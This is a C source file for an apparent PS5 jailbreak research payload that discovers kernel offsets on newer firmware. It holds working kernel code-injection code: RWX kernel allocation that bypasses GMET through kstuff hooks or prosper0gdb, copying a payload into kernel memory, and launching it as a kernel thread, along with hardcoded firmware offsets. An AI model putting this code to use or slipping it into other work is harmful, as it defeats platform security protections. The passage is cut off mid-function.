/*
 * PS5 Offset Discovery Tool (hv_research2)
 *
 * Standalone ELF payload for discovering ps5-kstuff offsets on unknown
 * firmware versions using TF (Trap Flag) single-stepping.
 *
 * Developed on FW 4.03 where offsets are known (for verification),
 * designed to be deployed on 4.50/4.51 where offsets are unknown.
 *
 * Usage: python3 send_elf.py <ps5_ip> --name hv_research2 hv_research2.elf
 *
 * Output: /data/etaHEN/hv_research2.log
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <elf.h>

#include <machine/sysarch.h>

#include <ps5/kernel.h>
#include <ps5/payload.h>

/* ─── Global state ─── */

static uint64_t g_dmap_base = 0;
static uint64_t g_kdata_base = 0;
static uint64_t g_ktext_base = 0;
static uint64_t g_fw_version = 0;
static uint64_t g_cr3_phys = 0;

/* Sysent discovery */
static uint64_t g_sysent_kva = 0;
#define SYSENT_STRIDE 0x30  /* 48 bytes per sysent entry on PS5 */

/* apic_ops discovery */
static uint64_t g_apic_ops_addr = 0;

/* ─── Notification helper ─── */

typedef struct {
    char useless1[45];
    char message[3075];
} notify_request_t;

int sceKernelSendNotificationRequest(int, notify_request_t*, size_t, int);

static void notify(const char *msg) {
    notify_request_t req;
    memset(&req, 0, sizeof(req));
    strncpy(req.message, msg, sizeof(req.message) - 1);
    sceKernelSendNotificationRequest(0, &req, sizeof(req), 0);
}

/* ─── Direct memory allocation ─── */

int sceKernelAllocateDirectMemory(off_t searchStart, off_t searchEnd,
                                  size_t len, size_t alignment,
                                  int memoryType, off_t *physAddrOut);
int sceKernelMapDirectMemory(void **addr, size_t len, int prot,
                             int flags, off_t directMemoryStart,
                             size_t alignment);

#define SCE_KERNEL_WB_ONION    0
#define SCE_KERNEL_PROT_CPU_RW 0x03

/* ─── Kernel struct offsets ─── */

#define OFFSET_PROC_P_VMSPACE    0x200
#define OFFSET_PMAP_PM_PML4      0x020

/* ─── Embedded kernel module (.ko) ─── */

__asm__ (
    ".section .rodata\n"
    ".global KMOD_KO\n"
    ".type KMOD_KO, @object\n"
    ".align 16\n"
    "KMOD_KO:\n"
    ".incbin \"kmod/hv_kmod.ko\"\n"
    "KMOD_KO_END:\n"
    ".global KMOD_KO_SZ\n"
    ".type KMOD_KO_SZ, @object\n"
    ".align 16\n"
    "KMOD_KO_SZ:\n"
    ".quad KMOD_KO_END - KMOD_KO\n"
);

extern const unsigned char KMOD_KO[];
extern const uint64_t KMOD_KO_SZ;

/* ─── Embedded flat binary kernel payload ─── */

__asm__ (
    ".section .rodata\n"
    ".global KMOD_FLAT\n"
    ".type KMOD_FLAT, @object\n"
    ".align 16\n"
    "KMOD_FLAT:\n"
    ".incbin \"kmod/hv_flat.bin\"\n"
    "KMOD_FLAT_END:\n"
    ".global KMOD_FLAT_SZ\n"
    ".type KMOD_FLAT_SZ, @object\n"
    ".align 16\n"
    "KMOD_FLAT_SZ:\n"
    ".quad KMOD_FLAT_END - KMOD_FLAT\n"
);

extern const unsigned char KMOD_FLAT[];
extern const uint64_t KMOD_FLAT_SZ;

/* ─── kstuff kekcall interface (PS5_kldload approach) ─── */

/* kstuff multiplexes kernel operations through syscall 0x27 (getpid)
 * with magic upper-32-bit prefixes in rax. */

static uint64_t kekcall_kmem_alloc(uint64_t size) {
    uint64_t ret;
    __asm__ volatile(
        "mov $0x600000027, %%rax\n"
        "syscall\n"
        : "=a"(ret)
        : "D"(size)
        : "rcx", "r11", "memory"
    );
    /* kmem_alloc returns lower bits; OR with kernel VA mask */
    return ret | 0xffffff8000000000ULL;
}

static uint64_t kekcall_kproc_create(uint64_t func, uint64_t args, uint64_t name) {
    uint64_t ret;
    __asm__ volatile(
        "mov $0x700000027, %%rax\n"
        "syscall\n"
        : "=a"(ret)
        : "D"(func), "S"(args), "d"(name)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static int kekcall_kstuff_check(void) {
    uint64_t ret;
    __asm__ volatile(
        "mov $0xffffffff00000027, %%rax\n"
        "syscall\n"
        : "=a"(ret)
        :
        : "rcx", "r11", "memory"
    );
    /* kstuff_check returns 0 if kstuff is active */
    return (int)ret;
}

/* ─── r0gdb / prosper0gdb loading (from PS5_kldload) ─── */

/* Embedded prosper0gdb binary (provides kernel function call capabilities) */
#include "payload_bin.c"

typedef struct __r0gdb_functions {
    int (*r0gdb_init_ptr)(void *ds, int a, int b, uintptr_t c, uintptr_t d);
    uint64_t (*r0gdb_kmalloc)(size_t sz);
    uint64_t (*r0gdb_kmem_alloc)(size_t sz);
    uint64_t (*r0gdb_kfncall)(uint64_t fn, ...);
    uint64_t (*r0gdb_kproc_create)(uint64_t kfn, uint64_t kthread_args,
                                    uint64_t kproc_name);
} __attribute__((__packed__)) r0gdb_functions;

static r0gdb_functions g_r0gdb;
static int g_r0gdb_loaded = 0;

#define R0GDB_ROUND_PG(x) (((x) + (0x4000 - 1)) & ~(0x4000 - 1))
#define R0GDB_TRUNC_PG(x) ((x) & ~(0x4000 - 1))
#define R0GDB_PFLAGS(x) ((((x) & PF_R) ? PROT_READ  : 0) | \
                          (((x) & PF_W) ? PROT_WRITE : 0) | \
                          (((x) & PF_X) ? PROT_EXEC  : 0))

static int load_r0gdb(void) {
    printf("[*] Loading prosper0gdb (r0gdb)...\n");

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)payload_bin;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(payload_bin + ehdr->e_phoff);
    void *base = (void *)0x0000000926100000ULL;

    /* Compute virtual memory region size */
    uintptr_t min_vaddr = (uintptr_t)-1;
    uintptr_t max_vaddr = 0;

    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_vaddr < min_vaddr)
            min_vaddr = phdr[i].p_vaddr;
        if (max_vaddr < phdr[i].p_vaddr + phdr[i].p_memsz)
            max_vaddr = phdr[i].p_vaddr + phdr[i].p_memsz;
    }
    min_vaddr = R0GDB_TRUNC_PG(min_vaddr);
    max_vaddr = R0GDB_ROUND_PG(max_vaddr);
    size_t base_size = max_vaddr - min_vaddr;

    /* Allocate memory */
    base = mmap(base, base_size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) {
        printf("[-] r0gdb mmap failed: %s\n", strerror(errno));
        return -1;
    }
    printf("[+] r0gdb mapped at %p (%zu bytes)\n", base, base_size);

    /* Load PT_LOAD segments */
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD && phdr[i].p_memsz && phdr[i].p_filesz) {
            memcpy((uint8_t *)base + phdr[i].p_vaddr,
                   payload_bin + phdr[i].p_offset,
                   phdr[i].p_filesz);
        }
    }

    /* Set protection bits */
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type != PT_LOAD || phdr[i].p_memsz == 0)
            continue;
        if (mprotect((uint8_t *)base + phdr[i].p_vaddr,
                     R0GDB_ROUND_PG(phdr[i].p_memsz),
                     R0GDB_PFLAGS(phdr[i].p_flags))) {
            printf("[-] r0gdb mprotect failed: %s\n", strerror(errno));
            return -1;
        }
    }

    /* Step 1: Call r0gdb entry point to populate function pointers.
     * The entry function receives payload_args + kernel_dynlib_dlsym ptr
     * + r0gdb_functions struct ptr. It writes function pointers into g_r0gdb. */
    void (*entry)(void *) = (void (*)(void *))(
        (uint8_t *)base + ehdr->e_entry);

    payload_args_t *args = payload_get_args();
    if (!args) {
        printf("[-] payload_get_args() returned NULL\n");
        return -1;
    }

    printf("[*] payload_args: dlsym=%p rwpair=[%d,%d] kdata=0x%lx\n",
           (void *)args->sys_dynlib_dlsym,
           args->rwpair[0], args->rwpair[1],
           (unsigned long)args->kdata_base_addr);

    /* Build extended args matching prosper0gdb's expected format */
    void *hacky_args = malloc(0x200);
    if (!hacky_args) {
        printf("[-] malloc failed\n");
        return -1;
    }
    memset(hacky_args, 0, 0x200);
    memcpy(hacky_args, args, sizeof(payload_args_t));
    uintptr_t *hack = (uintptr_t *)((uint8_t *)hacky_args + sizeof(payload_args_t));
    *hack = (uintptr_t)&kernel_dynlib_dlsym;
    *(hack + 1) = (uintptr_t)&g_r0gdb;

    printf("[*] Calling r0gdb entry at %p...\n", (void *)entry);
    fflush(stdout);
    entry(hacky_args);
    printf("[+] r0gdb entry returned\n");

    /* Step 2: Initialize r0gdb (separate call after entry populates ptrs) */
    if (!g_r0gdb.r0gdb_init_ptr) {
        printf("[-] r0gdb_init_ptr is NULL after entry()\n");
        printf("    r0gdb struct dump: ");
        uint8_t *p = (uint8_t *)&g_r0gdb;
        for (size_t i = 0; i < sizeof(g_r0gdb); i++)
            printf("%02x ", p[i]);
        printf("\n");
        free(hacky_args);
        return -1;
    }

    printf("[*] Calling r0gdb_init_ptr...\n");
    fflush(stdout);
    int init_ret = g_r0gdb.r0gdb_init_ptr(
        (void *)args->sys_dynlib_dlsym,
        (int)args->rwpair[0], (int)args->rwpair[1],
        0, args->kdata_base_addr);

    if (init_ret != 0) {
        printf("[-] r0gdb init failed (ret=%d)\n", init_ret);
        free(hacky_args);
        return -1;
    }

    /* Report function pointers */
    printf("[+] r0gdb initialized. Function pointers:\n");
    printf("    init_ptr     = %p\n", (void *)(uintptr_t)g_r0gdb.r0gdb_init_ptr);
    printf("    kmalloc      = %p\n", (void *)(uintptr_t)g_r0gdb.r0gdb_kmalloc);
    printf("    kmem_alloc   = %p\n", (void *)(uintptr_t)g_r0gdb.r0gdb_kmem_alloc);
    printf("    kfncall      = %p\n", (void *)(uintptr_t)g_r0gdb.r0gdb_kfncall);
    printf("    kproc_create = %p\n", (void *)(uintptr_t)g_r0gdb.r0gdb_kproc_create);

    if (!g_r0gdb.r0gdb_kmem_alloc || !g_r0gdb.r0gdb_kproc_create) {
        printf("[-] r0gdb missing required function pointers\n");
        free(hacky_args);
        return -1;
    }

    g_r0gdb_loaded = 1;
    printf("[+] r0gdb loaded and initialized successfully\n");

    free(hacky_args);
    return 0;
}

/* Args struct passed to flat binary module_start (must match hv_flat.c) */
struct kmod_flat_args {
    uint64_t output_kva;
    uint64_t kdata_base;
    uint32_t fw_ver;
    uint32_t pad;
};

/* ─── Kmod shared data structures (must match kmod/hv_kld.c) ─── */

#define KMOD_MAGIC          0xCAFEBABEDEAD1337ULL
#define KMOD_STATUS_DONE    2
#define OUTPUT_KVA_SENTINEL 0xDEAD000000000000ULL

struct kmod_result_buf {
    volatile uint64_t magic;
    volatile uint32_t status;
    volatile uint32_t pad0;
    volatile uint64_t idt_trampoline_kva;
    volatile uint32_t num_msr_results;
    volatile uint32_t pad1;
    struct {
        uint32_t msr_id;
        uint32_t valid;
        uint64_t value;
    } msr_results[16];
};

/* ─── Load kmod via kstuff kekcall (direct, no r0gdb) ─── */

/* Forward declarations */
static uint64_t va_to_pa(uint64_t va);

/* Detect kstuff-no-fpkg kekcall support.
 *
 * kstuff-no-fpkg intercepts syscall 0x27 (getppid) and multiplexes
 * operations via the upper 32 bits of rax. The CHECK call
 * (rax=0xffffffff00000027) returns 0 when kstuff-no-fpkg is active.
 *
 * This is inherently safe without kstuff-no-fpkg: the kernel only
 * reads the lower 32 bits (eax=0x27 → getppid), returning the parent
 * PID (always non-zero). With kstuff-no-fpkg, the hook intercepts
 * the upper bits and returns 0. */

static int detect_kstuff_kekcall(void) {
    printf("[*] Checking for kstuff-no-fpkg kekcall support...\n");

    int check = kekcall_kstuff_check();
    if (check == 0) {
        printf("[+] kstuff-no-fpkg kekcall active (check returned 0)\n");
        return 1;
    }

    printf("[*] kstuff kekcall not available (check returned %d = ppid)\n", check);
    printf("    Deploy kstuff-no-fpkg's kstuff.elf to /data/etaHEN/kstuff.elf\n");
    return 0;
}

static int load_kmod_kstuff(void *result_vaddr, uint64_t result_kva) {
    printf("\n[*] Trying kstuff kekcall approach (direct kmem_alloc + kproc_create)...\n");

    /* Detect kstuff-no-fpkg kekcall support. Safe to call even without
     * kstuff-no-fpkg — falls back to getppid which returns non-zero. */
    if (!detect_kstuff_kekcall()) {
        printf("[-] kstuff-no-fpkg not loaded — skipping kekcall path\n");
        return -1;
    }

    /* Allocate RWX kernel memory for our flat binary payload.
     * kstuff's kmem_alloc hooks the kernel allocator to mark pages RWX,
     * bypassing GMET (Guest Mode Execute Trap). */
    size_t payload_size = (size_t)KMOD_FLAT_SZ;
    size_t alloc_size = (payload_size + 0x3FFF) & ~0x3FFFULL;

    printf("[*] Allocating %zu bytes (%zu payload) of RWX kernel memory...\n",
           alloc_size, payload_size);
    fflush(stdout);

    uint64_t exec_code = kekcall_kmem_alloc(alloc_size);
    if (!exec_code || exec_code == (uint64_t)-1 ||
        exec_code == 0xffffff8000000000ULL) {
        printf("[-] kekcall_kmem_alloc(%zu) failed: 0x%lx\n",
               alloc_size, (unsigned long)exec_code);
        return -1;
    }
    printf("[+] RWX kernel allocation: 0x%lx (%zu bytes)\n",
           (unsigned long)exec_code, alloc_size);

    /* Allocate kernel memory for kthread name */
    uint64_t kproc_name = kekcall_kmem_alloc(0x100);
    if (!kproc_name || kproc_name == (uint64_t)-1 ||
        kproc_name == 0xffffff8000000000ULL) {
        printf("[-] kekcall_kmem_alloc(name) failed\n");
        return -1;
    }

    /* Allocate kernel memory for kproc args */
    uint64_t kthread_args = kekcall_kmem_alloc(sizeof(struct kmod_flat_args));
    if (!kthread_args || kthread_args == (uint64_t)-1 ||
        kthread_args == 0xffffff8000000000ULL) {
        printf("[-] kekcall_kmem_alloc(args) failed\n");
        return -1;
    }

    printf("[+] Kernel allocations:\n");
    printf("    exec_code:    0x%lx\n", (unsigned long)exec_code);
    printf("    kproc_name:   0x%lx\n", (unsigned long)kproc_name);
    printf("    kthread_args: 0x%lx\n", (unsigned long)kthread_args);

    /* Set up args for our flat binary payload */
    struct kmod_flat_args flat_args;
    flat_args.output_kva = result_kva;
    flat_args.kdata_base = g_kdata_base;
    flat_args.fw_ver = (uint32_t)(g_fw_version >> 16);
    flat_args.pad = 0;

    /* Write payload and args to kernel memory via kernel_copyin */
    printf("[*] Writing payload to RWX kernel memory...\n");
    kernel_copyin(KMOD_FLAT, exec_code, payload_size);

    static const char kthread_name_str[] = "hv_research\0";
    kernel_copyin(kthread_name_str, kproc_name, sizeof(kthread_name_str));
    kernel_copyin(&flat_args, kthread_args, sizeof(flat_args));

    /* Verify write */
    uint8_t verify[16];
    kernel_copyout(exec_code, verify, 16);
    printf("[*] First 16 bytes at exec_code: ");
    for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
    printf("\n");

    if (memcmp(verify, KMOD_FLAT, 16) == 0)
        printf("[+] Payload write verified OK\n");
    else {
        printf("[!] Payload verification mismatch!\n");
        printf("    Expected: ");
        for (int i = 0; i < 16; i++) printf("%02x ", KMOD_FLAT[i]);
        printf("\n");
        return -1;
    }

    /* Launch kernel thread */
    printf("[*] Creating kernel thread at 0x%lx (args=0x%lx)...\n",
           (unsigned long)exec_code, (unsigned long)kthread_args);
    fflush(stdout);

    uint64_t kproc_ret = kekcall_kproc_create(exec_code, kthread_args,
                                                kproc_name);
    printf("[+] kekcall_kproc_create returned: 0x%lx\n",
           (unsigned long)kproc_ret);

    /* Wait for kmod to complete */
    printf("[*] Waiting for kmod completion...\n");
    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;

    for (int i = 0; i < 50; i++) {
        usleep(100000);
        if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
            printf("[+] Kmod completed! (magic OK, status=DONE after %dms)\n",
                   (i + 1) * 100);
            return 0;
        }
        if (results->magic == KMOD_MAGIC) {
            printf("    magic OK, status=%u (waiting...)\n", results->status);
        }
    }

    printf("[!] Kmod did not complete (magic=0x%lx status=%u)\n",
           (unsigned long)results->magic, results->status);
    printf("[*] Result buffer dump: ");
    uint8_t *rb = (uint8_t *)result_vaddr;
    for (int i = 0; i < 64; i++) printf("%02x ", rb[i]);
    printf("\n");
    return -1;
}

/* ─── Load kmod via r0gdb (PS5_kldload approach) ─── */

static int load_kmod_r0gdb(void *result_vaddr, uint64_t result_kva) {
    printf("\n[*] Trying r0gdb approach (PS5_kldload)...\n");

    /* Load r0gdb if not already loaded */
    if (!g_r0gdb_loaded) {
        if (load_r0gdb() != 0) {
            printf("[-] Failed to load r0gdb\n");
            return -1;
        }
    }

    /* Allocate kernel memory for our flat binary payload */
    size_t payload_size = (size_t)KMOD_FLAT_SZ;
    uint64_t exec_code = g_r0gdb.r0gdb_kmem_alloc(payload_size);
    if (!exec_code || exec_code == (uint64_t)-1) {
        printf("[-] r0gdb_kmem_alloc(%zu) failed: 0x%lx\n",
               payload_size, (unsigned long)exec_code);
        return -1;
    }
    printf("[+] Kernel code allocation: 0x%lx (%zu bytes)\n",
           (unsigned long)exec_code, payload_size);

    /* Allocate kernel memory for kthread name */
    uint64_t kproc_name = g_r0gdb.r0gdb_kmem_alloc(0x100);
    if (!kproc_name || kproc_name == (uint64_t)-1) {
        printf("[-] r0gdb_kmem_alloc(name) failed\n");
        return -1;
    }

    /* Allocate kernel memory for kproc args */
    uint64_t kthread_args = g_r0gdb.r0gdb_kmem_alloc(sizeof(struct kmod_flat_args));
    if (!kthread_args || kthread_args == (uint64_t)-1) {
        printf("[-] r0gdb_kmem_alloc(args) failed\n");
        return -1;
    }

    printf("[+] Kernel allocations:\n");
    printf("    exec_code:    0x%lx\n", (unsigned long)exec_code);
    printf("    kproc_name:   0x%lx\n", (unsigned long)kproc_name);
    printf("    kthread_args: 0x%lx\n", (unsigned long)kthread_args);

    /* Set up args for our flat binary payload */
    struct kmod_flat_args flat_args;
    flat_args.output_kva = result_kva;
    flat_args.kdata_base = g_kdata_base;
    flat_args.fw_ver = (uint32_t)(g_fw_version >> 16);
    flat_args.pad = 0;

    /* Write payload and args to kernel memory */
    printf("[*] Writing payload to kernel memory...\n");
    kernel_copyin(KMOD_FLAT, exec_code, payload_size);

    static const char kthread_name[] = "hv_research\0";
    kernel_copyin(kthread_name, kproc_name, sizeof(kthread_name));
    kernel_copyin(&flat_args, kthread_args, sizeof(flat_args));

    /* Verify write */
    uint8_t verify[16];
    kernel_copyout(exec_code, verify, 16);
    printf("[*] First 16 bytes at exec_code: ");
    for (int i = 0; i < 16; i++) printf("%02x ", verify[i]);
    printf("\n");

    if (memcmp(verify, KMOD_FLAT, 16) == 0)
        printf("[+] Payload write verified OK\n");
    else
        printf("[!] Payload verification mismatch (may still work)\n");

    /* Launch kernel thread to execute our payload */
    printf("[*] Creating kernel thread at 0x%lx...\n", (unsigned long)exec_code);
    fflush(stdout);

    uint64_t kproc_ret = g_r0gdb.r0gdb_kproc_create(exec_code, kthread_args,
                                                       kproc_name);
    printf("[+] kproc_create returned: 0x%lx\n", (unsigned long)kproc_ret);

    /* Wait for kmod to complete */
    printf("[*] Waiting for kmod completion...\n");
    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;

    for (int i = 0; i < 50; i++) {  /* 5 seconds max */
        usleep(100000);  /* 100ms */
        if (results->magic == KMOD_MAGIC && results->status == KMOD_STATUS_DONE) {
            printf("[+] Kmod completed (magic OK, status=DONE)\n");
            return 0;
        }
        if (results->magic == KMOD_MAGIC) {
            printf("    magic OK, status=%u (waiting...)\n", results->status);
        }
    }

    printf("[!] Kmod did not complete (magic=0x%lx status=%u)\n",
           (unsigned long)results->magic, results->status);
    return -1;
}

/* kld syscall numbers */
#define SYS_kldload     304
#define SYS_kldunload   305
#define SYS_kldstat     308

struct kld_file_stat {
    int         version;
    char        name[1024];
    int         refs;
    int         id;
    uint64_t    address;
    uint64_t    size;
    char        pathname[1024];
};

/* ─── Known ps5-kstuff offsets for FW 4.03 (verification targets) ─── */

#define KSTUFF_IDT_OFF         0x64cdc80ULL
#define KSTUFF_GDT_OFF         0x64cee30ULL
#define KSTUFF_TSS_OFF         0x64d0830ULL
#define KSTUFF_PCPU_OFF        0x64d2280ULL
#define KSTUFF_SYSENTS_OFF     0x1709c0ULL
#define KSTUFF_QA_FLAGS_OFF    0x6506498ULL
#define KSTUFF_DORETI_IRET_OFF (-0x9cf84cLL)
#define KSTUFF_NOP_RET_OFF     (-0x9d20caLL)
#define KSTUFF_JUSTRETURN_OFF  (-0x9cf990LL)
#define KSTUFF_XINVTLB_OFF     (-0x96be70LL)
#define KSTUFF_COPYIN_OFF      (-0x9908e0LL)
#define KSTUFF_COPYOUT_OFF     (-0x990990LL)
#define KSTUFF_KMEM_ALLOC_OFF  (-0xc1ed0LL)
#define KSTUFF_KPROC_CREATE_OFF (-0x35ebf0LL)
#define KSTUFF_MALLOC_OFF      (-0xa9b00LL)
#define KSTUFF_KERNEL_PMAP_STORE_OFF 0x3257a78ULL

/* (Global state declared earlier) */
static int      g_apic_ops_count = 0;

/* Kmod info */
static int g_kmod_kid = -1;

/* ─── Page table walking ─── */

#define PTE_PRESENT   (1ULL << 0)
#define PTE_PS        (1ULL << 7)
#define PTE_PA_MASK   0x000FFFFFFFFFF000ULL
#define MAX_SAFE_PA   0x800000000ULL  /* 32GB */

/* ─── DMAP base discovery ─── */

static int discover_dmap_base(void) {
    uint64_t proc, vmspace, pmap_addr, pm_pml4, candidate_cr3;

    proc = kernel_get_proc(getpid());
    if (!proc) { printf("[-] Failed to get proc\n"); return -1; }

    kernel_copyout(proc + OFFSET_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));
    if (!vmspace) { printf("[-] Failed to get vmspace\n"); return -1; }

    kernel_copyout(vmspace + 0x1D0, &pmap_addr, sizeof(pmap_addr));
    if (!pmap_addr) { printf("[-] Failed to get pmap\n"); return -1; }

    kernel_copyout(pmap_addr + OFFSET_PMAP_PM_PML4, &pm_pml4, sizeof(pm_pml4));
    printf("[*] pm_pml4 = 0x%lx\n", pm_pml4);

    static const int cr3_offsets[] = {0x28, 0x30, 0x38, 0x40, 0x48};
    for (int i = 0; i < 5; i++) {
        kernel_copyout(pmap_addr + cr3_offsets[i], &candidate_cr3, sizeof(candidate_cr3));
        if (candidate_cr3 == 0 || candidate_cr3 > 0x800000000ULL) continue;
        if (candidate_cr3 & 0xFFF) continue;

        uint64_t candidate_dmap = pm_pml4 - candidate_cr3;
        if ((candidate_dmap >> 47) != 0 && candidate_dmap > 0xFFFF800000000000ULL) {
            uint64_t verify;
            if (kernel_copyout(candidate_dmap + candidate_cr3 + OFFSET_PMAP_PM_PML4,
                              &verify, sizeof(verify)) == 0) {
                g_dmap_base = candidate_dmap;
                g_cr3_phys = candidate_cr3;
                printf("[+] DMAP base: 0x%lx (cr3=0x%lx)\n", g_dmap_base, candidate_cr3);
                return 0;
            }
        }
    }

    printf("[-] Failed to discover DMAP base\n");
    return -1;
}

/* ─── FW version detection ─── */

static int init_fw_offsets(void) {
    g_fw_version = kernel_get_fw_version() & 0xFFFF0000;
    g_kdata_base = KERNEL_ADDRESS_DATA_BASE;
    g_ktext_base = KERNEL_ADDRESS_TEXT_BASE;

    printf("[*] FW: 0x%lx  kdata: 0x%lx  ktext: 0x%lx\n",
           g_fw_version, g_kdata_base, g_ktext_base);

    switch (g_fw_version) {
    case 0x4000000: case 0x4020000: case 0x4030000:
    case 0x4500000: case 0x4510000:
        printf("[+] FW 4.xx detected\n");
        break;
    default:
        printf("[!] FW 0x%lx may not be fully supported\n", g_fw_version);
        break;
    }
    return 0;
}

/* ─── Physical address resolution ─── */

static uint64_t va_to_cpu_pa(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) return 0;

    uint64_t e;
    kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PML4E not present for 0x%lx\n", va); return 0; }

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PDPTE not present for 0x%lx\n", va); return 0; }
    if (e & PTE_PS) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PDE not present for 0x%lx\n", va); return 0; }
    if (e & PTE_PS) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);

    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) { printf("[!] PTE not present for 0x%lx\n", va); return 0; }
    return (e & PTE_PA_MASK) | (va & 0xFFF);
}

/* Silent page table walk */
static uint64_t va_to_pa(uint64_t va) {
    if (!g_cr3_phys || !g_dmap_base) return 0;
    uint64_t e;
    kernel_copyout(g_dmap_base + g_cr3_phys + ((va >> 39) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 30) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 21) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    if (e & PTE_PS) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    kernel_copyout(g_dmap_base + (e & PTE_PA_MASK) + ((va >> 12) & 0x1FF) * 8, &e, 8);
    if (!(e & PTE_PRESENT)) return 0;
    return (e & PTE_PA_MASK) | (va & 0xFFF);
}

/* ─── Sysent table discovery ─── */

static void discover_sysent(void) {
    printf("\n[*] Discovering sysent table...\n");

    /* Try known offset first */
    uint64_t ks_sysent = g_kdata_base + KSTUFF_SYSENTS_OFF;
    uint64_t pa = va_to_pa(ks_sysent);
    if (!pa) {
        printf("[-] sysent VA->PA failed\n");
        return;
    }

    /* Verify: sysent[20] = getpid, narg should be 0 */
    int32_t narg = -1;
    uint64_t getpid_pa = va_to_pa(ks_sysent + 20ULL * SYSENT_STRIDE);
    if (getpid_pa) {
        kernel_copyout(g_dmap_base + getpid_pa, &narg, 4);
    }

    if (narg == 0) {
        g_sysent_kva = ks_sysent;
        printf("[+] sysent at kdata+0x%lx (getpid narg=%d) [VERIFIED]\n",
               (unsigned long)KSTUFF_SYSENTS_OFF, narg);
    } else {
        printf("[-] sysent verification failed (getpid narg=%d)\n", narg);
        printf("    Will need to scan for sysent on this FW.\n");
    }
}

/* ─── apic_ops discovery ─── */

#define APIC_OPS_KNOWN_OFFSET  0x170650  /* Known offset on FW 4.03 */
#define APIC_OPS_KNOWN_COUNT   28

/* Check if value looks like a ktext function pointer */
static int is_ktext_ptr(uint64_t val) {
    return (val >= g_ktext_base &&
            val < g_ktext_base + 0x2000000 &&
            (val & 0x3) == 0);
}

static void discover_apic_ops(void) {
    printf("\n[*] Discovering apic_ops table...\n");

    /* ── Direct check at known FW 4.03 offset ── */
    {
        uint64_t known_kva = g_kdata_base + APIC_OPS_KNOWN_OFFSET;
        uint64_t known_pa = va_to_pa(known_kva);
        printf("[*] Direct check at known offset kdata+0x%x...\n",
               APIC_OPS_KNOWN_OFFSET);
        if (known_pa && known_pa < MAX_SAFE_PA) {
            uint64_t ptrs[40];
            kernel_copyout(g_dmap_base + known_pa, ptrs, sizeof(ptrs));
            int run = 0;
            for (int i = 0; i < 40; i++) {
                if (is_ktext_ptr(ptrs[i])) run++;
                else break;
            }
            if (run >= 20) {
                g_apic_ops_addr = known_kva;
                g_apic_ops_count = run;
                printf("[+] CONFIRMED: apic_ops at kdata+0x%x (%d entries)\n",
                       APIC_OPS_KNOWN_OFFSET, run);
                printf("    slot[2] (xapic_mode) = 0x%016lx (ktext+0x%lx)\n",
                       (unsigned long)ptrs[2],
                       (unsigned long)(ptrs[2] - g_ktext_base));
                return;
            }
            printf("    Only %d consecutive ktext ptrs at known offset\n", run);
        } else {
            printf("    Page not mapped at known offset\n");
        }
    }

    /* ── Full scan: read kdata in 4KB chunks via DMAP ──
     *
     * Read page-sized chunks to avoid cross-page reads.
     * Track runs of consecutive ktext pointers across chunk boundaries.
     * Score candidates by entry count, uniqueness, and spread. */
    printf("[*] Full scan: kdata 8MB for apic_ops...\n");

    #define APIC_SCAN_SIZE   0x800000  /* 8MB */
    #define APIC_SCAN_CHUNK  0x1000    /* 4KB per read */

    int best_len = 0, best_score = 0;
    uint64_t best_addr = 0;
    int run_len = 0;
    uint64_t run_start = 0;
    uint8_t chunk[APIC_SCAN_CHUNK];

    for (uint64_t off = 0; off < APIC_SCAN_SIZE; off += APIC_SCAN_CHUNK) {
        uint64_t scan_kva = g_kdata_base + off;
        uint64_t scan_pa = va_to_pa(scan_kva);
        if (!scan_pa || scan_pa >= MAX_SAFE_PA) {
            /* Page not mapped — end any current run */
            if (run_len >= 4) goto score_run;
            run_len = 0;
            continue;
        }

        kernel_copyout(g_dmap_base + scan_pa, chunk, APIC_SCAN_CHUNK);
        uint64_t *qwords = (uint64_t *)chunk;
        int nqwords = APIC_SCAN_CHUNK / 8;

        for (int qi = 0; qi < nqwords; qi++) {
            if (is_ktext_ptr(qwords[qi])) {
                if (run_len == 0)
                    run_start = scan_kva + qi * 8;
                run_len++;
            } else {
                if (run_len >= 4) goto score_run;
                run_len = 0;
                continue;
            score_run: ;
                /* Score this candidate */
                if (run_len >= 26 && run_len <= 32) {
                    /* Re-read the full table from run_start */
                    uint64_t rs_pa = va_to_pa(run_start);
                    if (rs_pa && rs_pa < MAX_SAFE_PA) {
                        uint64_t tbl[40];
                        int cnt = run_len;
                        if (cnt > 40) cnt = 40;
                        kernel_copyout(g_dmap_base + rs_pa, tbl, cnt * 8);

